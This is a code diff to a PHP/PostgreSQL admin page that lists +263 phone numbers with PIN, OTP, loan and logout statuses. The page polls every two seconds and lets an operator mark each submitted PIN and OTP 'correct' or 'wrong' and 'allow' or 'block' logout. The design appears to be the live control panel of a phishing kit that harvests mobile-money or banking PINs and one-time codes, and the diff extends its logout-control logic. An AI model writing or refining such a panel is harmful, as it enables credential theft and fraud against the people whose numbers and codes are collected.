@@ -15,14 +15,13 @@ if(!$conn) die("DB error");
 $checkCol = pg_query($conn, "SELECT column_name FROM information_schema.columns WHERE table_name='users' AND column_name='created_at'");
 if(!$checkCol || pg_num_rows($checkCol)==0){
     pg_query($conn, "ALTER TABLE users ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP");
-    // Also update existing rows with a default timestamp (optional)
     pg_query($conn, "UPDATE users SET created_at = NOW() WHERE created_at IS NULL");
 }
 
 // Ensure `approve` column exists
 pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS approve INTEGER DEFAULT 0");
 
-// Ensure `logout` column exists (default 0)
+// Ensure `logout` column exists (default 0, but values: 0=default, 1=Yes/Allow, 2=No/Block)
 pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS logout INTEGER DEFAULT 0");
 
 // Handle AJAX updates
@@ -37,7 +36,13 @@ if($_SERVER['REQUEST_METHOD']=='POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']
         case 'pin': $col='pin'; $val=($action=='correct')?1:0; break;
         case 'otp': $col='otp'; $val=($action=='correct')?1:0; break;
         case 'loan': $col='approve'; $val=($action=='approve')?1:0; break;
-        case 'logout': $col='logout'; $val=($action=='allow')?1:0; break;
+        case 'logout': 
+            $col='logout'; 
+            // Map actions to values: allow=1 (Yes), block=2 (No)
+            if($action=='allow') $val=1;
+            elseif($action=='block') $val=2;
+            else $val=0;
+            break;
         default: echo json_encode(['success'=>false]); exit;
     }
     $r=pg_query_params($conn,"UPDATE users SET $col=$1 WHERE phone=$2",[$val,$phone]);
@@ -101,7 +106,8 @@ $totalRecords = count($records);
         .badge-success{background-color:#d4edda;color:#155724;}
         .badge-warning{background-color:#fff3cd;color:#856404;}
         .badge-approved{background-color:#cce5ff;color:#004085;}
-        .badge-logout{background-color:#f8d7da;color:#721c24;}
+        .badge-logout-yes{background-color:#d4edda;color:#155724;}
+        .badge-logout-no{background-color:#f8d7da;color:#721c24;}
         .btn-group{display:flex;flex-wrap:wrap;gap:8px;}
         .btn{border:none;padding:6px 14px;border-radius:8px;font-size:0.75rem;font-weight:500;cursor:pointer;white-space:nowrap;}
         .btn-pin{background-color:#1d4ed8;color:#fff;}
@@ -117,10 +123,8 @@ $totalRecords = count($records);
         .modal-content p{margin:0 0 20px;font-size:1.2rem;font-weight:500;}
         .modal-buttons{display:flex;flex-direction:column;gap:12px;}
         .modal-buttons button{padding:12px;border:none;border-radius:50px;font-size:1rem;font-weight:600;cursor:pointer;width:100%;}
-        .btn-correct,.btn-approve{background-color:#10b981;color:#fff;}
-        .btn-wrong,.btn-default{background-color:#ef4444;color:#fff;}
-        .btn-allow{background-color:#10b981;color:#fff;}
-        .btn-block{background-color:#ef4444;color:#fff;}
+        .btn-correct,.btn-approve,.btn-allow{background-color:#10b981;color:#fff;}
+        .btn-wrong,.btn-default,.btn-block{background-color:#ef4444;color:#fff;}
         footer{padding:14px 20px;background:#f8f9fa;font-size:0.7rem;color:#6c757d;text-align:center;border-top:1px solid #e0e0e0;}
         @media(max-width:700px){body{padding:10px;}h1{font-size:1.2rem;padding:14px 16px;}th,td{padding:8px 8px;font-size:0.8rem;}.btn{padding:5px 10px;font-size:0.7rem;}.badge{font-size:0.7rem;padding:3px 8px;}}
         @media(max-width:550px){.table-wrapper{padding:12px;}.btn-group{flex-direction:column;gap:6px;}.btn{text-align:center;}}
@@ -132,12 +136,13 @@ $totalRecords = count($records);
     <div class="table-wrapper">
         <table id="dataTable">
             <thead>
-                <tr><th>#</th><th>Phone</th><th>PIN</th><th>OTP</th><th>Loan</th><th>Logout</th><th>Actions</th></tr>
+                <tr><th>#</th><th>Phone</th><th>PIN</th><th>OTP</th><th>Loan</th><th>Logout (1=Yes/2=No)</th><th>Actions</th></tr>
             </thead>
-            <tbody id="tableBody"><tr><td colspan="7">Loading...</td></tr></tbody>
+            <tbody id="tableBody"><tr><td colspan="7">Loading...</td></tr>
+            </tbody>
         </table>
     </div>
-    <footer>✅ Newest shown first (top). # numbers: newest = highest number.<br>Click a button → On (1) / Off (0). Logout: Allow (1) / Block (0).</footer>
+    <footer>✅ Newest shown first (top). # numbers: newest = highest number.<br>📌 Logout values: 1 = Yes (Logged In / Allow), 2 = No (Logged Out / Block), 0 = Default</footer>
 </div>
 <div id="verifyModal" class="modal"><div class="modal-content"><p id="modalMessage"></p><div class="modal-buttons" id="modalButtons"></div></div></div>
 <script>
@@ -153,19 +158,34 @@ function renderTable(records){
     if(!totalRows){ tableBody.innerHTML='<tr><td colspan="7">No records found.</td></tr>'; return; }
     let html='';
     records.forEach((rec,idx)=>{
-        const rowNumber = totalRows - idx; // newest gets highest number
+        const rowNumber = totalRows - idx;
         const phone=escapeHtml(rec.phone);
         const pinStatus=rec.pin_status;
         const otpStatus=rec.otp_status;
         const loanApprove=rec.loan_approve;
         const logoutStatus=rec.logout_status;
+        
+        // Format logout display: 1=Yes/Allow, 2=No/Block, 0=Default
+        let logoutDisplay = '';
+        let logoutClass = '';
+        if(logoutStatus === 1){
+            logoutDisplay = 'Yes (1)';
+            logoutClass = 'badge-logout-yes';
+        } else if(logoutStatus === 2){
+            logoutDisplay = 'No (2)';
+            logoutClass = 'badge-logout-no';
+        } else {
+            logoutDisplay = 'Default (0)';
+            logoutClass = 'badge-warning';
+        }
+        
         html+=`<tr data-phone="${phone}">`;
         html+=`<td style="text-align:center; font-weight:bold;">${rowNumber}</td>`;
         html+=`<td>+263 ${phone}</td>`;
         html+=`<td><span class="badge ${pinStatus?'badge-success':'badge-warning'}">${pinStatus?'On (1)':'Off (0)'}</span></td>`;
         html+=`<td><span class="badge ${otpStatus?'badge-success':'badge-warning'}">${otpStatus?'On (1)':'Off (0)'}</span></td>`;
         html+=`<td><span class="badge ${loanApprove?'badge-approved':'badge-warning'}">${loanApprove?'Approved (1)':'Default (0)'}</span></td>`;
-        html+=`<td><span class="badge ${logoutStatus?'badge-logout':'badge-warning'}">${logoutStatus?'Allowed (1)':'Blocked (0)'}</span></td>`;
+        html+=`<td><span class="badge ${logoutClass}">${logoutDisplay}</span></td>`;
         html+=`<td class="btn-group">
             <button class="btn btn-pin verify-pin" data-phone="${phone}">🔐 PIN</button>
             <button class="btn btn-otp verify-otp" data-phone="${phone}">📱 OTP</button>
@@ -176,13 +196,21 @@ function renderTable(records){
     tableBody.innerHTML=html;
     attachEvents();
 }
+
 function escapeHtml(str){ return str.replace(/[&<>]/g,m=>m=='&'?'&amp;':m=='<'?'&lt;':m=='>'?'&gt;':m); }
+
 function attachEvents(){
     document.querySelectorAll('.verify-pin').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'pin',[{label:'✅ On (1)',action:'correct',class:'btn-correct'},{label:'❌ Off (0)',action:'wrong',class:'btn-wrong'}]); });
     document.querySelectorAll('.verify-otp').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'otp',[{label:'✅ On (1)',action:'correct',class:'btn-correct'},{label:'❌ Off (0)',action:'wrong',class:'btn-wrong'}]); });
     document.querySelectorAll('.verify-loan').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'loan',[{label:'✅ Approve (1)',action:'approve',class:'btn-approve'},{label:'❌ Default (0)',action:'default',class:'btn-default'}]); });
-    document.querySelectorAll('.verify-logout').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'logout',[{label:'✅ Allow (1)',action:'allow',class:'btn-allow'},{label:'❌ Block (0)',action:'block',class:'btn-block'}]); });
+    document.querySelectorAll('.verify-logout').forEach(btn=>{ 
+        btn.onclick=()=>showModal(btn.dataset.phone,'logout',[
+            {label:'✅ Yes - Logged In (1)',action:'allow',class:'btn-allow'}, 
+            {label:'❌ No - Logged Out (2)',action:'block',class:'btn-block'}
+        ]); 
+    });
 }
+
 function showModal(phone,type,options){
     pendingPhone=phone; pendingType=type;
     let typeLabel = type==='pin'?'PIN':type==='otp'?'OTP':type==='loan'?'Loan':'Logout';
@@ -196,7 +224,9 @@ function showModal(phone,type,options){
     });
     modal.style.display='flex';
 }
+
 function closeModal(){ modal.style.display='none'; pendingPhone=pendingType=null; }
+
 async function updateStatus(phone,type,action){
     let fd=new FormData(); fd.append('phone',phone); fd.append('type',type); fd.append('action',action);
     try{
@@ -207,6 +237,7 @@ async function updateStatus(phone,type,action){
     }catch(e){ alert('Network error'); }
     closeModal();
 }
+
 async function fetchData(){
     try{
         let res=await fetch(window.location.href+'?fetch_data=1');
@@ -214,6 +245,7 @@ async function fetchData(){
         renderTable(records);
     }catch(e){ console.error(e); }
 }
+
 window.onclick=e=>{ if(e.target===modal) closeModal(); };
 fetchData();
 setInterval(fetchData,2000);
